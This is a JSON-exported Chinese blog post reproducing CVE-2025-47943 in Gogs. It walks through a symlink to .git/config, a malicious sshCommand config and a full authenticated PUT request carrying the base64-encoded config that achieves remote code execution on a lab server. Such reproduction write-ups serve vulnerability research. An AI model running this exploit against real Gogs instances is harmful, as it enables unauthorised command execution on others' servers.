{"title":"gogs-CVE-2025-47943漏洞复现","uid":"7d55e013b18c9fec141f6ee29b3992ce","slug":"gogs-CVE-2025-47943漏洞复现","date":"2025-06-26T06:51:10.000Z","updated":"2025-06-26T09:57:10.547Z","comments":true,"path":"api/articles/gogs-CVE-2025-47943漏洞复现.json","keywords":null,"cover":[],"content":"<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><p>这是在2024年的暴露漏洞的payload。我们下面还会用到。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[core]\n    repositoryformatversion &#x3D; 0\n    filemode &#x3D; true\n    bare &#x3D; false\n    logallrefupdates &#x3D; true\n    ignorecase &#x3D; true\n    precomposeunicode &#x3D; true\n    sshCommand &#x3D; echo pwnned &gt; &#x2F;tmp&#x2F;poc\n[remote &quot;origin&quot;]\n    url &#x3D; git@github.com:torvalds&#x2F;linux.git\n    fetch &#x3D; +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*\n[branch &quot;master&quot;]\n    remote &#x3D; origin\n    merge &#x3D; refs&#x2F;heads&#x2F;master<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>diff文件：<code>https://github.com/gogs/gogs/compare/v0.13.2...v0.13.3</code></p>\n<p>可以看到diff主要是针对link做的处理，并且主要在<code>internal/db/repo_editor.go</code>中。<br><img src=\"/images/2025-06-26-17-16-18.png\"></p>\n<p>可以看一下函数<em><em>UpdateRepoFile(doer <em>User, opts UpdateRepoFileOptions)</em></em> 调用栈，一共有两处调用，一处已经在24年被修复，另一处在</em><em>PutContents(c <em>context.APIContext, r PutContentsRequest)</em></em> 中<br><img src=\"/images/2025-06-26-17-19-48.png\"></p>\n<p>这块是路径拼接，我们可以指定到自己的link文件中，但是这块传入的是分支名，所以就需要创建一个和link文件同名的分支。</p>\n<p>但是直接打会发现这个是401未授权，这里发现&#x2F;api类的请求需要经过token认证，这里去生成一个token传入即可。<br><img src=\"/images/2025-06-26-17-23-06.png\"></p>\n<p><img src=\"/images/2025-06-26-17-23-52.png\"></p>\n<h2 id=\"RCE方式\"><a href=\"#RCE方式\" class=\"headerlink\" title=\"RCE方式\"></a>RCE方式</h2><h3 id=\"步骤1\"><a href=\"#步骤1\" class=\"headerlink\" title=\"步骤1\"></a>步骤1</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">ln -s test.log &#x2F;.git&#x2F;config<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/images/2025-06-26-17-26-52.png\"></p>\n<h3 id=\"步骤2\"><a href=\"#步骤2\" class=\"headerlink\" title=\"步骤2\"></a>步骤2</h3><p>上传到服务端</p>\n<h3 id=\"步骤3\"><a href=\"#步骤3\" class=\"headerlink\" title=\"步骤3\"></a>步骤3</h3><p><img src=\"/images/2025-06-26-17-48-40.png\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">PUT &#x2F;api&#x2F;v1&#x2F;repos&#x2F;admin1&#x2F;aad&#x2F;contents&#x2F;test.log HTTP&#x2F;1.1\nHost: 10.211.55.2:3000\nAccept-Language: zh-CN,zh;q&#x3D;0.9\nCookie: lang&#x3D;zh-CN; i_like_gogs&#x3D;5ffa15fe4d7cf341\nUpgrade-Insecure-Requests: 1\nAuthorization: token 3d540c72e3a5fed2cfb27ce4fb95eb46bf4dc39f\nUser-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;137.0.0.0 Safari&#x2F;537.36\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7\nAccept-Encoding: gzip, deflate\nContent-Type: application&#x2F;json\n\n&#123;\n&quot;content&quot;:&quot;W2NvcmVdCiAgICByZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKICAgIGZpbGVtb2RlID0gdHJ1ZQogICAgYmFyZSA9IGZhbHNlCiAgICBsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQogICAgaWdub3JlY2FzZSA9IHRydWUKICAgIHByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQogICAgc3NoQ29tbWFuZCA9IGVjaG8gcHdubmVkID4gL3RtcC9wb2MKW3JlbW90ZSAib3JpZ2luIl0KICAgIHVybCA9IGdpdEBnaXRodWIuY29tOnRvcnZhbGRzL2xpbnV4LmdpdAogICAgZmV0Y2ggPSArcmVmcy9oZWFkcy8qOnJlZnMvcmVtb3Rlcy9vcmlnaW4vKgpbYnJhbmNoICJtYXN0ZXIiXQogICAgcmVtb3RlID0gb3JpZ2luCiAgICBtZXJnZSA9IHJlZnMvaGVhZHMvbWFzdGVy&quot;,\n&quot;message&quot;: &quot;12312&quot;,\n&quot;branch&quot;: &quot;main&quot;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"/images/2025-06-26-17-48-24.png\"></p>\n<p><strong>Tip</strong> </p>\n<ul>\n<li>需要使用git来进行管理提交（不能使用创建新文件）。</li>\n</ul>\n","text":"漏洞复现这是在2024年的暴露漏洞的payload。我们下面还会用到。 [core] repositoryformatversion &#x3D; 0 filemode &#x3D; true bare &#x3D; false logallrefupdates &#x3D; t...","link":"","photos":[],"count_time":{"symbolsCount":"2.4k","symbolsTime":"2 mins."},"categories":[],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":1,"path":"api/tags/漏洞复现.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">漏洞复现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#RCE%E6%96%B9%E5%BC%8F\"><span class=\"toc-text\">RCE方式</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A41\"><span class=\"toc-text\">步骤1</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A42\"><span class=\"toc-text\">步骤2</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%AD%A5%E9%AA%A43\"><span class=\"toc-text\">步骤3</span></a></li></ol></li></ol></li></ol>","author":{"name":"Q16G","slug":"blog-author","avatar":"https://q16g-image.oss-cn-beijing.aliyuncs.com/image-20230925201943513.png","link":"/","description":"Q16G","socials":{"github":"https://github.com/Q16G","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_57222016?spm=1018.2226.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{}}